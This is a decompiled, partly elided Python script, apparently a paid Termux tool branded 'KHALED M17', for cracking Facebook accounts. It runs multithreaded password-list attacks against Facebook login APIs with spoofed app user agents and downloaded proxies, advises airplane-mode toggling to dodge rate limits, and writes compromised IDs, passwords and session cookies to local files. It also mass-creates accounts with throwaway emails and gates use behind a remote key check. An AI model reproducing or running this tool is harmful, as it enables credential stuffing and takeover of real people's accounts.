"""
# Orignally Written By KHALED ABBES
# Totally Written in python
//DECOMPILED BY KHALED T-7
#FACEBOOK : KHALED ABBES T-7
"""
...
os.system('xdg-open https://t.me/KHALED16xv')
print('\033[1;32m[\033[1;37m✓\033[1;32m] \033[1;32mPLEASE WAIT CHECKING UPDATE...')
print('\033[1;32m[\033[1;37m✓\033[1;32m] \033[1;32mWELLCOM TO KHALED M17 TOOL...')
os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
...
try:
    prox= requests.get('https://raw.githubusercontent.com/KHALED T-7/YOUSIF16/main/prox.txt').text
...
sys.stdout.write('\x1b]2; KHALED M17 \x07')
logo=(f"""\033[1;37m
...
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mFACEBOK : KHALED ANNABI
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGITHUB  : KHALED T-7
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSERVICE : \033[1;32mPAID
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVERSION : \033[1;32m0.1
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in KHALED folder
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
def clear():
...
def menu():
            clear()
        #    linex()
            print(' \33[37;42m\t Welcome KHALED T-7  Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mKHALED T-7 Crack Has Been Running \n\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
                ...
                exit()
                 ...
                 os.system('xdg-open https://t.me/KHALEDT-7/16xv')
            elif xd in ['6','06']:
                 os.system('xdg-open https://www.facebook.com/KHALEDT-7/6')
            elif xd in ['0','00']:
                exit(' Thanks for use ❤ ')
            else:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [KHALED-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [KHALED-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/KHALED/KHALED-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [KHALED-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/KHALED/KHALED-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/KHALED/KHALED-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [KHALED-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KHALED/KHALED-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KHALED/KHALED-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [KHALED-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [KHALED-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/KHALED/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KHALED/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [KHALED-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KHALED/KHALED-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=(f"KHALED~CREATE:{uid}TS{key1}110E==")
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [KHALED-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [KHALED-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/KHALED/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def createip():
	os.system("cd && git clone https://github.com/khaled/t-17/YOUSIF16")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/KHALED.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/KHALED.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        #input(' Exit And Again Run The Command');os.system('python KHALED.py')
       # tks = ('Hello%20KHALED%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)

    r1 = requests.get('https://KHALED166.blogspot.com/2023/12/key.html').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20KHALED%20Owner%20YOUSIF%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
        main_apv()
menu()
